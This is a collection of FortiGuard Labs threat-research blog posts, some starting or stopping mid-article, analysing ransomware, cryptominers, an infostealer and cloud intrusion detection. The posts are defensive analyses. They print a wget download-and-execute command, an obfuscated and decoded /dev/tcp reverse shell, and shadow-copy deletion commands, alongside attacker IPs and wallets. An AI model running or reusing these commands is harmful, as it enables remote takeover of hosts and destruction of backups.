    "content": "FortiGuard Labs Threat Research Built-In Decryption or Just Another Trap? Affected Platforms: Microsoft WindowsImpacted Users:Microsoft WindowsImpact:Most files on the compromised machines are encryptedSeverity Level:High FortiGuard Labs recently ran across NailaoLocker, a ransomware variant targeting Microsoft Windows systems. Like many ransomware families, it uses AES-256-CBC to encrypt user files. What sets it apart is the presence of hard-coded SM2 cryptographic keys and a built-in decryption function—an uncommon combination that raises immediate questions about intent. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The name “Nailao,” which means “cheese” in Chinese, may be more than a naming quirk. This ransomware could represent a rare opportunity: a payload with embedded recoverability. Or it could be bait—a trap laid to mislead victims and security researchers. One victim’s solution may, in this case, be another’s cheese. In this blog, we examine NailaoLocker’s complete technical profile, including its execution flow, encryption and decryption routines, and use of SM2 cryptography. We assess whether this variant introduces a genuine threat or exposes an exploitable flaw. NailaoLocker is delivered to the target system as a set of three files: Execution begins when the attacker triggers usysdiag.exe, which loads the malicious sensapi.dll using a DLL side-loading technique. This DLL decrypts and loads the actual ransomware payload (usysdiag.exe.dat) directly into memory. To minimize forensic traces, NailaoLoader frees its own library from memory and deletes sensapi.dll immediately after execution. To prevent multiple instances from running simultaneously, NailaoLocker creates a mutex named lockv7. After loading, NailaoLocker checks a hard-coded value against the string \"XXXX\" to determine which mode to activate: encryption or decryption. This variant does not support command-line arguments for mode selection, indicating that the switch is built-in and may be reserved for internal use or testing. Before execution proceeds, the ransomware performs a series of setup tasks. It launches a console window to display real-time status updates, signaling no intent to conceal its activity. It also creates a log file at %ProgramData%\\lock.log, where it records progress throughout the encryption or decryption process. In encryption mode, the ransomware retrieves the ransom note from its own binary using a simple XOR decoding routine. This note is later dropped into the affected directories. To optimize performance, NailaoLocker uses a multi-threaded architecture coordinated through Windows I/O Completion Ports (IOCP). This design enables high-throughput encryption or decryption across multiple processor cores. An I/O Completion Port is initialized by calling CreateIoCompletionPort(). The main thread performs file system traversal and submits target file handles to the IOCP queue. Meanwhile, each worker thread waits for a handle to appear in the queue. When a file is received, the thread proceeds with encryption or decryption as appropriate. This model decouples file discovery from processing, allowing the ransomware to efficiently scale across available CPU resources. The GetSystemInfo() function is invoked to determine the number of logical processors available on the system. Using this information, the ransomware creates at least eight worker threads to handle concurrent file operations. This guarantees a baseline level of parallelism, even on lower-core systems. In the next section, we examine the two distinct execution modes—encryption and decryption—and provide a detailed analysis of their functionality. A distinctive feature of this NailaoLocker variant is its inclusion of a hard-coded SM2 key pair embedded in ASN.1 DER format. These keys are used during both encryption and decryption. As shown in Figure 1, the embedded key structure contains a public key and a private key. The public key, based on elliptic curve cryptography, includes x and y coordinates that define a point on the SM2 curve. The private key—rarely seen in ransomware samples—is also present, suggesting a potential test build or alternate use case. After extraction, the keys are initialized using the OpenSSL function EVP_PKEY_CTX_new(). Mapping from the hard-coded string “SM2”, the numerical identifier is set to 0x494 and is passed to the encryption function. This is further supported by the presence of the expected curve OID—06 08 2A 81 1C CF 55 01 82 2D—within the ASN.1 structure. When running in encryption mode, NailaoLocker performs two primary tasks: identifying target files and encrypting them using AES-256-CBC. It also appends a ransom note to each affected directory. NailaoLocker begins by enumerating all logical drives on the system. It recursively searches accessible directories for files to encrypt, while deliberately skipping specific system paths and file types to avoid destabilizing the infected host. Excluded file extensions: Excluded directories and files: Once a target file is identified, its handle is pushed to the IO Completion Port queue for processing by a worker thread. A ransom note is also dropped into each of the enumerated directories. Each file sent to the I/O Completion Port is processed by a worker thread, which executes the encryption routine using a unique AES key and IV. At the start of each thread, NailaoLocker allocates memory for 38 _OWORD (16-byte) elements. This space is used to store the AES key, IV, their SM2-encrypted versions, and related metadata. The ransomware uses BCryptGenRandom() to generate a 32-byte AES key and a 16-byte IV for each file: These values are used for file encryption with the AES-256-CBC algorithm. Instead of securing the AES key and IV with RSA, as is common in ransomware, NailaoLocker uses SM2, an elliptic curve cryptographic algorithm. This appears to be the first documented case of SM2 being used to protect symmetric file encryption keys in ransomware. Because SM2 does not produce a fixed-length output, the ransomware stores the sizes of the encrypted AES key and IV in two _WORD fields. The full memory layout includes: For each target file, NailaoLocker appends the .locked extension and sets the file attribute to FILE_ATTRIBUTE_HIDDEN. It then reads up to 0x10000 bytes (64 KB) of data per operation. The ransomware performs encryption using the AES-256-CBC algorithm through OpenSSL’s EVP interface. The process includes: The encrypted data replaces the original content. To facilitate decryption, the ransomware assigns a LARGE_INTEGER (8 bytes) to hold the original file size. This value is stored in thefirst 8 bytesof the encrypted file, allowing the decryptor to navigate to the footer containing key material. After the encrypted payload, the ransomware appends a structured footer. It begins with a 4-byte marker 47 56 37 00 (\"LV7\") to indicate the start of the encryption key section. The original file content was shifted to storing the file size. Also, the encryption padding extends the file size. These bytes are not able to fit in the space before the “LV7” flag and are placed after the encrypted AES key and IV. Following the \"LV7\" marker, NailaoLocker stores all remaining cryptographic and overflow data in a fixed sequence. This layout is color-coded in Figure 15: Once encryption is complete, NailaoLocker restores the file’s original last edit timestamp and renames it with the .locked extension (if not already applied). It then prints the total encryption duration to the console in the format done [time], where [time] represents the duration of the encryption operation. In decryption mode, the ransomware requires the SM2 private key to reconstruct the AES key and IV, which are stored at the end of each encrypted file. It then traverses each directory to find encrypted files and performs the decryption process to restore them to their original status. In this section, we will detail the process and validate the correctness of the built-in ASN.1 DER format of the SM2 private key. To initiate decryption mode, we modify the hard-coded value to be the same as \"XXXX,\" prompting the ransomware to switch modes. Upon switching to decryption mode, the file traversal function is adjusted to search for files with the \".locked\" extension, adding them to the IO Completion Port queue for processing. Again, at least eight threads are created to accelerate the decryption process. Each thread begins by parsing the footer of the encrypted file. The ransomware locates the \"LV7\" marker and reads the data that follows: The SM2 private key, extracted earlier from the embedded ASN.1 DER block, is used to decrypt both the AES key and IV. Once the AES key and IV are recovered, the file content is decrypted using AES-256-CBC via OpenSSL’s EVP interface: Unfortunately, in testing, the embedded SM2 private key failed to correctly decrypt the AES key, suggesting the key material may be incomplete or deliberately non-functional. However, FortiGuard analysts confirmed that when the correct AES key and IV are manually supplied—captured during encryption—the decryption function performs as expected and successfully restores the original file contents. This analysis provides a detailed technical profile of NailaoLocker, a ransomware variant notable for its embedded SM2 key pair and built-in decryption function. Although the embedded SM2 private key is non-functional in practice, testing confirms that the decryption logic operates correctly when supplied with valid AES key material, indicating this may be an in-development strain or internal test build. The use of the Chinese SM2 cryptographic standard, particularly to protect AES file encryption keys, marks a notable divergence from conventional ransomware practices. FortiGuard Labs will continue to monitor for the further adoption of region-specific algorithms and for signs that NailaoLocker is evolving toward active deployment. FortiGuard Labs detects the NailaoLocker ransomware samples with the following AV signatures: FortiEDR,FortiXDR, andFortiDeceptorprovide additional protection by detecting anomalous behavior, halting malicious encryption attempts in real time, and diverting ransomware away from production environments. All protections are continuously updated based on real-time intelligence shared across Fortinet’s global sensor network, partner CERTs, and trusted threat intelligence alliances. Fortinet recommends all organizations maintain a strong ransomware defense posture that includes: If you feel your organizations has been impacted by NailaoLocker or any other ransomware, our globalIncident Responseteam can assist with detection, containment, remediation, and recovery. 1248c4b352b9b1325ef97435bd38b2f02d21e2c6d494a2218ee363d9874b760746f3029fcc7e2a12253c0cc65e5c58b5f1296df1e364878b178027ab26562d6860133376a7c8e051da787187761e596ce9b3d0cfcea21ed8f434992aa7cb8605 FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc.

    "content": "FortiGuard Labs Threat Research Detect Cloud Intrusions Faster with Correlated Alerts and Contextual Timelines in FortiCNAPP Moderncyberattacks targeting cloud environmentsare increasingly complex and difficult to detect. Attackers often use multi-stage techniques—such as authentication abuse, privilege escalation, command execution, and interaction withcloud-native APIs—to gain and expand access. Each step in this attack chain often mimics legitimate administrative or developer activity, making it extremely difficult to identify malicious intent. Typical attacker behaviors—such as logging in from a new IP address, accessing previously unused cloud services, or executing command-line processes—can appear indistinguishable from routine actions by developers, admins, or automation. Complicating matters, there is often no single signature, rule, or event that definitively indicates a compromise has occurred. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. As a result, cloud intrusion detection requires examining multiple signals in context. A single weak signal may be inconclusive. But when multiple anomalies involve the same users, resources, or compute nodes over a short period, the likelihood of a targeted intrusion increases significantly. This behavioral correlation is what separates real attacks—or evenpenetration testing—from normal workload activity. FortiCNAPPaddresses this challenge by correlating weak indicators into a coherent picture usingComposite Alertsand theObservation Timeline. The sections below examine how these capabilities work in practice, along with real-world examples that illustrate their value in detecting cloud-native intrusions. To improve detection precision and reduce the burden on security analysts, FortiCNAPP has introduced Composite Alerts. This technology identifies intrusions not by detecting a single event, but by aggregating and correlating multiple indicators associated with the same entity over a defined time window. Each Composite Alert compiles a series of detections, such as suspicious logins, first-time use of administrative APIs, or anomalous container behavior, and links them to specific cloud resources, user identities, or compute instances. Applying a correlation window also allows FortiCNAPP to detect patterns that emerge over minutes or hours rather than the milliseconds of traditional attacks. This approach offers several advantages: As a result, security teams can shift away from reactive alert triage and instead engage in informed, prioritized investigation. By presenting correlated signals with contextual metadata and entity linkage, FortiCNAPP enables analysts to focus their time on evaluating credible threats rather than chasing disconnected anomalies, streamlining the path from detection to resolution. To reduce mean time to triage (MTTT), FortiCNAPP provides each Composite Alert in the form of an Observation Timeline. This timeline serves as both evidence and explanation, enabling the analyst to quickly understand why the alert was generated, which entities were involved, and what sequence of events took place. Each Observation Timeline includes two foundational elements: Once FortiCNAPP has identified a primary entity, such as a compromised IAM user, workload, or compute node, it constructs a timeline by aggregating all related observations for that entity across the alert window. For each observation, the timeline includes: By presenting these elements in a concise, ordered structure, the timeline equips the user to assess the threat in context. This makes it easier to answer key questions, such as: This structured format reduces cognitive load by eliminating the need for analysts to manually reconstruct sequences of activity from disparate logs. It also minimizes investigative overhead by clearly presenting relevant behaviors and their associated metadata in context, enabling faster escalation, more accurate threat classification, and higher-confidence incident response decisions. The first alert involves a machine monitored by a FortiCNAPP agent that was flagged as potentially compromised. Potentially Compromised Host Host machines may have been compromised. The following entities are suspected. Hosts: ip-10-123-45-67 The machine suspected of compromise had the hostname ip-10-123-45-67. Additional host details were available to the end user. The timeline begins on May 13 at 12:00 PM, when FortiCNAPP observed a new vulnerable application installed on the host. Two days later, on May 15 at 10:00 AM, the system launched several new child applications—processes not previously seen originating from this parent process. At 10:36 AM, the timeline flagged a possible reverse shell command. Inspection of the associated command line confirmed it: the host initiated an outbound connection to a remote system, granting that system interactive shell access—even if the machine was behind a firewall or otherwise unreachable from the internet. Further activity that day strengthened the case for compromise. At 12:00 PM, the host contacted a known-bad external domain. At 12:51 PM, it resolved the domain to an internal IP, indicating a successful DNS lookup. By 1:00 PM, it had established an anomalous command-line connection to an external server using wget. This suggests the attacker downloaded and executed malicious code from a remote source. The use of wget with the -qO- flag—which suppresses output and streams the response directly to stdout for execution by a child process—further supports the likelihood of malicious behavior. At this stage, the timeline provides strong evidence of compromise. For further validation, analysts could expand the “+19 more” related entities linked to the “New child application launched” detection. Within this expanded set, multiple command lines reveal obfuscated commands designed to download remote code and execute it locally. This example: /usr/bin/git archive --format=zip --prefix=en --exec=`wget -qO /tmp/QrXErNRt http:// 10.203.118.5:8080/sYdelk;chmod +x /tmp/QrXErNRt;/tmp/QrXErNRt;rm -f /tmp/QrXErNRt` --remote=bOCNVQ/ -- abuses git and wget to download remote code to a file in the tmp directory, execute it, and then clean it up. This example: /usr/bin/git archive --format=zip --prefix=HS --exec=`perl -e 'system(pack(qq,H152,,qq, 62617368202d632027303c263138392d3b65786563203138393c3e2f6465762f7463702f31302e3230332e3131382e352f343434343b7368203c26313839203e2631383920323e2631383927,))'` --remote=dspUKieP/ -- also abuses git, but this time it leverages perl to run an obfuscated script. That obfuscated script, when decoded, is the reverse shell command identified by the syscall detection bash -c 0<&189-;exec 189<>/dev/tcp/ 10.203.118.5/4444;sh <&189 >&189 2>&189 The ability to detect highly obfuscated commands as anomalous and incorporate them into the narrative of a larger suspected attack is a key benefit of FortiCNAPP’s Composite Alerts and of the Observation Timeline feature. This second alert involves AWS identities monitored by FortiCNAPP using CloudTrail logs. Potentially Compromised AWS Keys AWS credentials may have been compromised. The following entities are suspected. Users: AssumedRole/123456789012:AWSReservedSSO_AdministratorAccess_b4a9c2f1837e4d1a; Principal Ids: AROAREDACTEDM9V2Q3LXD:firstname.lastname@redactedcompany.com. In this case, the entity suspected of compromise was the identity AssumedRole/123456789012:AWSReservedSSO_AdministratorAccess_b4a9c2f1837e4d1a, specifically as used by firstname.lastname@redactedcompany.com, as indicated by the principal_id. The timeline began on May 27, when this identity called APIs across 17 AWS regions and 28 different AWS services, suggesting reconnaissance activity. On May 28, the same identity made additional API calls from a previously unseen IP address located outside AWS infrastructure. Over the following two hours, FortiCNAPP observed several additional anomalies associated with this identity, including the use of new services, access to previously used services in new regions, and API calls that resulted in errors. Several of the APIs accessed were sensitive for infrastructure and service discovery. The Lacework customer who received this alert confirmed it as a malicious intrusion. What made this case particularly noteworthy was the absence of an obvious “smoking gun.” Unlike the first example, where reverse shell commands and obfuscated payloads clearly indicated malicious activity, this scenario involved a user behaving anomalously over time in ways that resembled legitimate exploration. The suspicious nature of the behavior became apparent only when the events were viewed in aggregate. FortiCNAPP’s ability to detect this threat did not rely on a single decisive signal. Instead, it resulted from correlating multiple weak signals into a structured timeline. This allowed analysts to determine that a critical mass of suspicious behavior had occurred. This example illustrated the power of Composite Alerts. By aggregating low-signal anomalies that might otherwise be dismissed, FortiCNAPP surfaced a high-fidelity detection—catching the intrusion during the early Discovery phase, before the attacker could escalate privileges or cause damage. Composite Alerts enable security teams to focus on meaningful patterns of behavior that indicate real threats, rather than manually correlating isolated detections. By automatically assembling related signals into a coherent, time-ordered timeline, FortiCNAPP reduces the effort required to identify and respond to cloud-native attacks. Analysts no longer need to reconstruct the narrative from scratch. FortiCNAPP delivers it with supporting evidence and clear entity context. This allows security teams to shift from reactive triage to informed, prioritized investigation. By presenting correlated signals with contextual metadata, FortiCNAPP enables your analysts to focus on credible threats rather than chasing unrelated anomalies. In cloud environments, where attacker dwell times are short and lateral movement can occur quickly, timely and structured detection is essential for containing threats before they escalate into breaches or operational disruptions.

Combined with the widespread availability of commercial tools, this trend has significantly lowered the barrier to entry for cybercriminal activity. In this next section, we will examine some interesting aspects of the identified samples. H2Miner continues to rely heavily on scripts to disable defenses and expand access, ultimately enabling the deployment of miners. Many of these scripts resemble previously documented variants; however, this version has been updated with new deployment URLs. This script includes code blocks that are structurally similar to earlier H2Miner samples used to terminate security software. However, this variant goes further by also targeting database and user application processes. Additionally, it deploysKinsing malware, establishes persistence by registering itself as a service, and attempts to eliminate competing miners by terminating related processes and clearing associated cron entries. The script then checks for an existing cron entry that downloads and executes itself from 80[.]64[.]16[.]241, and adds the entry if it’s missing. Finally, it clears both the current and persistent shell command history to cover its tracks. This script closely resembles earlier H2Miner scripts used to terminate processes and deploy Kinsing malware, but it includes updated URLs. Notably, the script targets theAlibaba Cloud Security Center agentas well as processes andcontainer images running within Docker, indicating an awareness of cloud-specific defenses and containerized environments. This script functions as aKinsing updater. It removes any existing Kinsing installation and redeploys it by downloading and executing a shell script similar in structure to ce.sh. Several additional scripts identified during this investigation reuse code blocks from ce.sh, spr.sh, and cpr.sh. While their specific logic may vary, their ultimate purpose remains consistent: deployingKinsing, a remote access trojan (RAT) commonly used to deliver crypto miners in compromised environments.

This PowerShell script downloads anXMRig Monero minerfrom 78[.]153[.]140[.]66 and saves it to the system’s temporary directory as sysupdate. It then creates a scheduled task using schtasks with the name\"Update service for Windows Service\"to ensure persistence. The script’s structure closely resembles those used in early 2021 mining campaigns and appears to have been reused for current operations. Notably, this XMRig miner is also deployed by theLcrypt0rx ransomwarevariant. The associated configuration file (ff1706b37fea16d75b739a5396d9ffba) points to theMonero wallet:4ASk4RhUyLL7sxE9cPyBiXb82ofekJg2SKiv4MKtCbzwHHLQxVVfVr4D4xhQHyyMTieSM5VUFGR9jZVR5gp6sa1Q2p8SahC This wallet has been previously linked to H2Miner campaigns dating back to late 2021, indicating continuity or overlap in its operator. This usage of older scripts and samples with updated configurations and hosting URLs points to a resurgence of older campaigns from2020and2021. Analysis of this sample shows that it follows the following step-by-step process: Lcrypt0rx first checks if it is running with administrator privileges. If not, it relaunches itself with elevated rights using Shell.Application to invoke wscript.exe with the /elevated flag. Once elevated, the script disables a range of system utilities and user protections by modifying the Windows Registry. These include: It also disables the execution of several critical tools: Lcrypt0rx then attempts to establish persistence by adding its full path to theWinlogon Shellregistry key and registering itself as anImage File Execution Options (IFEO)debugger for cmd.exe. However, these attempts fail because the script path is addedwithout prependingwscript.exe, rendering the entries non-functional. Using WMI, the script then forcibly terminates taskmgr.exe, msconfig.exe, and regedit.exe. It also modifies theScancode Mapregistry to disable a wide range of keys, including: Mouse buttons are reversed, and all changes are applied immediately to disrupt user control.

Lcrypt0rx then attempts to disable Windows Defender real-time protection, BitDefender, and Kaspersky. However, the methods used for BitDefender and Kaspersky are ineffective—likely artifacts of LLM hallucinations. The firewall is disabled via netsh. An 8,192-character master key is then generated using ASCII values 1–255, and a per-file salt of equal length is appended to it during the encryption process. This key-salt pair is used to XOR-encode each file’s content. Folders selected for encryption include standard directories and OneDrive backups. System recovery is disrupted by: cmd.exe /c vssadmin delete shadows /all /quietcmd.exe /c wbadmin delete catalog -quiet Next, a ransom note is dropped in multiple locations (Desktop, Documents, Pictures, Videos, Downloads, Music) and opened in Notepad. The message demands$1,000(up from $500 in earlier samples) and shortens the payment deadline from 5 to 3 days. The .onion URL in the note is syntactically incorrect and doesn't match the one shown in the desktop wallpaper, which uses an obsolete V2 TOR address, suggesting a placeholder or reuse by H2Miner actors. An image from https://s10[.]krakenfiles[.]com/uploads/30-04-2025/605q6HLKTv/image[.]jpg is then downloaded and set as the desktop background by editing the HKCU\\Control Panel\\Desktop\\Wallpaper registry key. The TOR address in the image aligns with older Lcryx variants. Lcrypt0rx then establishes fallback persistence by dropping and registering multiple embedded scripts via run keys. This time, persistence works correctly, with the scripts executed using wscript.exe and marked as read-only, system-protected, and hidden. A summary of the scripts is listed below: Full path Description C:\\Windows\\SysWOW64\\msvcr80.dll.bat Ping’s ragebot[.]fun, a game cheat developer site. C:\\Windows\\System32\\systemconfig.exe.vbs Denial-of-Service script that floods the system's network interface’s gateway and ragebot[.]fun with 45 MB HTTP POSTs.

C:\\Windows\\CDConnector.vbs Monitors for any connected CD drive and attempts to eject it. C:\\Windows\\System32\\slmgr.bat.vbs Launches itself with the windows hidden and continuously displays a message box demanding ransom payments. It also resets the system time to 00:00, likely in an attempt to confuse system logs. The script then modifies the hosts file to block AV-related domains and disables cmd.exe for the current user by setting: HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\\DisableCMD Lcrypt0rx then downloads and executes miners and infostealers before finally entering the encryption routine.This section is not seen in older Lcryx samples.

The config used for Monero mining points to the following wallets for mining payouts: Lcrypt0rx now enters a persistent loop that continuously scans the previously enumerated directories and any attached storage volumes for new files to encrypt. Each file is processed through an encryption routine with multiple checks and conditions. The routine begins by attempting to open the file using the OpenTextFile method in VBScript. This fails for executables, DLLs, and other system-critical formats, which are excluded by default through error handling. Before proceeding, the script verifies whether the file: Files that fail these checks are queued for encryption. To encrypt each file, Lcrypt0rx generates a unique8,192-character saltcomposed of ASCII characters (codes 1–255), which it appends to a pre-generated master key. This is a notable change from earlier Lcryx variants, where the salt length was only 32 characters. The script then XORs each character of the file content with the corresponding character from the combined key-salt pair, producing the obfuscated output. The resulting data is saved to a new file with the .lcryx extension, and the original file is deleted to complete the encryption process. As a final step, Lcrypt0rx checks all targeted folders for files associated with backups. Any files with recognized backup-related extensions are deleted to further prevent recovery. Despite these actions, the ransomware does not transmit or store the encryption keys locally or remotely. Combined with the use of simple XOR encryption, this makes recovery trivial through basic cryptanalysis. The lack of key management, combined with the presence of scare tactics and superficial ransom demands, suggests that Lcrypt0rx operates more asscarewarethan a serious ransomware threat. The H2Miner threat actors have remained active and adaptable since first emerging in late 2019. Their recent campaigns continue to rely on a blend of reused, proven tooling and newly integrated elements, including the curious addition of Lcrypt0rx ransomware. While Lcrypt0rx lacks the sophistication of more advanced ransomware families, it introduces distinct techniques for degrading system usability, UI interference, and redundant embedded scripts. It also bundles commercially available hack tools and infostealers, expanding its functionality beyond simple encryption. Ultimately, both the H2Miner and Lcrypt0rx chains converge on the deployment of Monero miners, a hallmark of resource hijacking campaigns. In cloud environments, this results in significant financial impact, as compromised systems incur elevated compute costs, degraded performance, and increased operational risk. The campaign reflects a broader trend: the commodification of cybercrime, where access to prebuilt tools, LLM-generated code, and cheap infrastructure lowers the barrier to entry, enabling even low-skill actors to launch high-impact campaigns. Fortinet customers are protected from the threats described in this report through multiple layers of defense provided by theFortinet Security FabricandFortiGuard security services.

    "title": "How FortiSandbox 5.0 Detects Dark 101 Ransomware Despite Evasion Techniques",
    "link": "https://www.fortinet.com/blog/threat-research/fortisandbox-detects-dark-101-ransomware-despite-evasion-techniques",
    "content": "FortiGuard Labs Threat Research Exposing the attack chain—from evasion to ransom note deployment The FortiGuard Labs team recently identified a ransomware that belongs to the Dark 101 malware family. The ransomware is delivered as an obfuscated .NET binary with the objectives of encrypting the victim’s personal files, deleting backup copies and the backup catalog, disabling recovery mode and Task Manager, and ultimately demanding a ransom payment in Bitcoin to decrypt the files. All behavioral data presented in this article was obtained from a Sandbox report, while additional reverse engineering was conducted to uncover further capabilities of the malware. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The FortiSandbox report documented the malware's behavior and provided visual aids to support the analysis. The following Tree View diagram (Figure 1) illustrates the execution sequence, outlining the chronological order of actions and processes initiated by the ransomware. The visual representation provides valuable insights into the malware’s operational flow, allowing users to track its behavior and comprehend its execution logic. Additionally, suspicious indicators triggered during the analysis were recorded (Figure 2), offering further context and aiding in the identification of suspicious and malicious activities. The ransomware first attempts to detect an analysis environment by checking whether the executable is running outside the %Appdata% folder. If so, it introduces a 10-second delay before continuing execution. However, FortiSandbox accurately simulates a realistic user environment by executing the sample from an expected location, allowing the ransomware to proceed without delay or altered behavior, thereby ensuring full visibility during analysis. An image of the sleepOutOfTempFolder function responsible for this environment check and delay is shown in Figure 3. Afterwards, the ransomware copies itself into the %Appdata% folder and renames itself to svchost.exe. This name mimics a legitimate Windows system process, which normally resides in C:\\Windows\\System32. By adopting this trusted name, the ransomware attempts to evade detection and reduce the chance of raising suspicion among users and automated tools. As shown in Figure 4, FortiSandbox correctly flags this process as high risk due to its suspicious behavior and inconsistent file location. As part of its anti-recovery strategy, the Dark 101 ransomware executes a series of destructive system commands designed to eliminate any possibility of restoring encrypted files through Windows’ built-in recovery features. Specifically, it runs the following commands, shown in Figures 5 and 6. The first two commands remove all Volume Shadow copies, which are typically used by the system to restore previous versions of the files. The third command deletes the Windows Backup catalog, effectively severing access to any system image backups that may have been created. By chaining these commands together, the ransomware ensures that both shadow copies and formal backup metadata are eradicated, leaving the victim with no local recovery option. Following the execution of vssadmin, wmic, and wbadmin commands to eliminate recovery options, the Dark 101 ransomware proceeds to disable Task Manager by modifying the Windows Registry. It sets the DisableTaskMgr value under the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System key to 1, which prevents users from launching the Task Manager. This tactic is commonly used to hinder user intervention, making it more difficult to terminate the ransomware process or inspect running activity. By restricting access to a critical system tool, the malware increases its persistence. Figure 7 shows the registry modification captured during execution. After disabling recovery mechanisms and system utilities, the ransomware begins scanning the file system directories for targets to encrypt. It targets user-accessible locations that are likely to contain personal or sensitive data, while avoiding critical system files and directories to prevent system instability. The ransomware maintains a predefined list of file extensions that are associated with documents, images, archives, databases, and other valuable content. Only files matching these extensions are selected for encryption, maximizing impact while minimizing the risk of a system failure. Once a file is identified and deemed valid for encryption, the ransomware encrypts its content and appends a randomly generated four-character extension to the filename. This not only renders the file unusable but also serves as a marker indicating successful encryption. Figure 8 displays a partial list of file extensions targeted during the encryption To inform the victim and demand payment, the Dark 101 ransomware drops a ransom note named read_it.txt into every directory containing encrypted files. This text file serves as an extortion message, notifying the victim that their data has been encrypted and providing detailed instructions on how to make a ransom payment. The note demands payment in Bitcoin and typically includes a unique identifier or contact information, such as an email address, to establish communication with the attacker. This tactic is designed to pressure the victim into complying with the ransom demands. Figure 10 shows the ransom note captured during analysis. With the ransom note deployed and encryption complete, the execution phase of the Dark 101 ransomware is complete. At this point, the malware has disabled recovery options, encrypted valuable files, and left payment instructions to coerce the victim into compliance. FortiSandbox successfully captured each stage of the attack—from evasion and execution to encryption and extortion, enabling comprehensive behavioral analysis and the extraction of threat intelligence. MITRE ATT&CK The table below lists the techniques used by the ransomware. This analysis of Dark 101 ransomware highlights the sophistication of modern malware and the need for proactive defense.

    "content": "FortiGuard Labs Threat Research How AI is Reshaping the Malware Arms Race From the beginning, the antivirus world has been acat-and-mousegame, where malware authors and antivirus engineers constantly adapt their code to bypass or catch each other. Artificial Intelligence is bringing the game to the next level, with malware authors using AI to improve their malware[1] and anti-virus engineers using AI to assist them with reverse engineering[2]. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. Nowadays,nearly all malware is packed and/or obfuscated. AI doesn’t help (yet) for packers: we tried this on a Linux/Prometei botnet sample from February 2025, and the AI would have wasted time reversing the inner logics of the packer if we hadn’t helped it out. To be fair,unpacking is a difficult task that current disassemblers like IDA Pro or Ghidra can’t do either.It’s something an AV analyst has to perform beforehand and then supply the unpacked binary for further analysis. As for obfuscation, the news is far better. While AI would probably fail and require human assistance for complicated obfuscation, it works reasonably well over standard obfuscation and junk code. This is a significant advancement for the antivirus industry. In the example below, the AI successfully analyzed the obfuscation algorithm of Linux/Ladvix.E and implemented a working de-obfuscator.[3] Another technique which has been trending in the malware scene for a few years is the use of specific frameworks (e.g, Flutter [4]) or high-level languages (Go, Rust). Currently, AI struggles with Flutter and Rust malware, which is not surprising because the field is still new. Human researchers struggle to find solutions, too! We tried AI-assistance over the “Flutter assembly” of Android/SpyLoan: it was totally helpless, didn’t map function names or strings, etc. However, when we proceed in a smarter way and produce the Blutter[5]output for the malware, thenAI is able to reconstruct very readable Dart code. AI is quite successful with the older Delphi language. We assume the reason is that LLMs were trained with Delphi and Pascal material. Despite being old, Delphi is still strangely used to implement Linux/Filecoder.BR!tr (aka Trigona) ransomware (sample from April 2025). For example, Ghidra meticulously decompiles the main function of the ransomware. We can immediately identify Delphi function names (e.g SYSTEM_RANDOM), followed by their types (LONGINT, LONGINT), and inner memory management functions (FPC_ANSISTR_DECR_REF). The former are interesting because they correspond to code that the malware author explicitly called. The latter are not interesting for malware analysis as they are inserted by the compiler (Free Pascal Compiler, in this case) to handle Ansi strings. When asked to decompile the same function,the AI smartly removes those inner calls and produces source code that is way easier to readthan what Ghidra gave. The anti-virus world has always been a cat-and-mouse game. While AI is close to defeating standard string and code obfuscation, malware authors are likely to adapt by using more complex obfuscation. Similarly, malware authors can harden reverse engineering by using recent frameworks and languages. So, where’s the progress, might you argue? The main difference is that, for once, the antivirus industry has a new tool that helps it more than the adversary. We areforcingmalware authors to use more complex obfuscation and newer frameworks and languages. Rust is more secure than C? Sure! Butthey have to make the effort to learn how to use Rust, use new libraries, cope with bugs, etc. And while they do that, our LLMs can update and train on those novelties even faster. Yes,it’s the first time in 20 years where time and tools are in our favor.

    "title": "NordDragonScan: Quiet Data-Harvester on Windows",
    "link": "https://www.fortinet.com/blog/threat-research/norddragonscan-quiet-data-harvester-on-windows",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attacksSeverity Level:High FortiGuard Labs recently uncovered an active delivery site that hosts a weaponized HTA script and silently drops the infostealer “NordDragonScan”into victims’ environments. Once installed, NordDragonScan examines the host and copies documents, harvests entire Chrome and Firefox profiles, and takes screenshots. The package is then sent over TLS to its command-and-control server, “kpuszkiev.com,” which also serves as a heartbeat server to confirm the victim is still online and to request additional data when needed. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. Attackers leverage shorter link services with “hxxps://cutt[.]ly/4rnmskDe” that redirects to “hxxps://secfileshare[.]com,” triggering the download of a RAR archive named “Укрспецзв_Акт_30_05_25_ДР25_2313_13 від 26_02_2025.rar” (Ukrspetszv_Act_30_05_25_DR25_2313_13 dated 26_02_2025). This file contains a malicious LNK shortcut that silently invokes mshta.exe to execute the hosted HTA payload “1.hta” from the same server. The malicious HTA file copies the legitimate PowerShell.exe binary to the path “C:\\Users\\Public\\Documents\\install.exe” to mask itself. It then downloads an encoded TXT file from a remote server, decodes it, and saves the result as “Act300525.doc.” This decoy document, titled “Акт здачі-приймання наданих Послуг до договору про надання послуг” (Act of Acceptance of Services under Service Agreement), is benign and intended to distract the user. Finally, the HTA script quietly drops and executes the actual malicious payload, embedded as a hardcoded executable named adblocker.exe, into the victim’s directory “\\AppData\\Local\\Temp\\adblocker.exe.” The attacker’s server maintains multiple decoy files designed to entice user interactions. These decoys employ a similar HTA script mechanism, which drops and executes the same payload, “adblocker.exe,” on compromised systems. The repeated use of the same executable across diverse decoys suggests a systematic approach by the threat actor to maximize infection opportunities while utilizing varied document themes and filenames to evade detection and security monitoring. The payload is a .NET executable containing an embedded PDB path: “C:\\Users\\NordDragon\\Documents\\visual studio.” NordDragonScan employs a custom string obfuscation routine, which performs an XOR operation and byte-swapping to conceal hard-coded strings from static analysis. It initially verifies if its dedicated working directory, “NordDragonScan,” exists in the “%LOCALAPPDATA%” folder. If this directory is absent, it creates it as a staging area to 